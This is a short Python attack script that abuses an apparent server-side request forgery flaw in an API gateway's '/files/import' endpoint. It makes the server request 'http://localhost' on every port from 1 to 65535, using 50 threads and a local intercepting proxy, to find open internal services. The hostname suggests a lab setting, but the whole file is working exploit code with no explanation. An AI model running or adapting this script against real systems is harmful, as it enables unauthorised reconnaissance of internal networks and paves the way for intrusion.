#!/usr/bin/python3

import requests
import concurrent.futures

target = "http://apigateway:8000/files/import"
header = {"Content-Type": "application/json"}
proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

# Function to scan ports and send requests
def portScanner(port):
    data = {"url": "http://localhost:{}".format(port)}
    # print(f"scanning port: {port}")
    r = requests.post(url=target, headers=header, proxies=proxies, json=data)

    if "INTERNAL_SERVER_ERROR" not in r.text:
        print("[+] port {} - status code: {}".format(port, str(r.status_code)))

# Using multithreading to scan ports
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    port_range = range(1, 65536)  # Ports range from 1 to 65535
    executor.map(portScanner, port_range)

print("Completed")